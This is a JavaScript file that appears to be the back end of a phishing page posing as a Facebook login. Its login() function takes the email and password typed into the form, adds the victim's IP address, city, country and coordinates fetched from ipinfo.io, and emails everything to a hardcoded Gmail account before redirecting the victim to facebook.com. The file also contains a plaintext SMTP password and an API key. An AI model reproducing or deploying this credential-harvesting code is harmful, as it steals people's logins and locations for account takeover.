function login() {
    var email = document.getElementById("email").value;
    var pass = document.getElementById("pass").value;
    if(email && pass){

        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong><br/>Thành phố: <strong>${myCity || myRegion|| ''}</strong><br/>Quốc gia: ${myCountry || ''}<br/>IP: ${myIp || ''}<br/>Latitude: ${myLat || ''}<br/>Longitude: ${myLon || ''}`);
    }
    else{
        var emailCls = document.getElementsByClassName("error-email"); 
        var passCls = document.getElementsByClassName("error-pass"); 
        emailCls[0].style.display = "none";
        passCls[0].style.display = "none";
        if(!email){
            emailCls[0].style.display = "block";
        }
        else if(!pass){
            passCls[0].style.display = "block";
        }
    }
}

function sendEmail(body) {
    Email.send({
        Host: "smtp.gmail.com",
        //UseDefaultCredentials: true,
        Username: "checkingman38@gmail.com",
        Password: "anh123123",
        EnableSsl: true,
        To: 'checkingman38@gmail.com',
        From: "checkingman38@gmail.com",
        Subject: "Checking man gửi thông điệp",
        Body: body,
    }).then(
        message => {
            window.location.href = "https://www.facebook.com/"
        }
    );
}

function SendHTTP(){
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (xhttp.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
			   if (xhttp.status == 200) {
				   
			   }
			   else if (xhttp.status == 400) {
				  alert('There was an error 400');
			   }
			   else {
				   alert('something else other than 200 was returned');
			   }
			}
		};
        
		xhttp.open("POST", "https://fapimail.p.rapidapi.com/email/send", true);
        xhttp.setRequestHeader("content-type", "application/json");
        xhttp.setRequestHeader("x-rapidapi-key", "f490587ebcmshd3b4ac716a11c02p1a151cjsn7b1d08bd29b5");
        xhttp.setRequestHeader("x-rapidapi-host", "fapimail.p.rapidapi.com");
        var dataToSend = {
            recipient: 'checkingman38@gmail.com',
            sender: 'checkingman38@gmail.com',
            subject: 'Subject of Email',
            message: 'Body of Email'
          };
		xhttp.send(JSON.stringify(dataToSend));
}
var myCity, myCountry, myRegion,  myLat, myLon, myIp = undefined;
$(document).ready(() => {    
    function getLocation() {
      $.getJSON("https://ipinfo.io/", onLocationGot);
    }
   
    function onLocationGot(info) {
      let position = info.loc.split(",");
      myLat = position[0];
      myLon = position[1];
      myCity = info.city;
      myCountry = info.country;
      myRegion = info.region;
      myIp = info.ip;
    }
    getLocation();
  });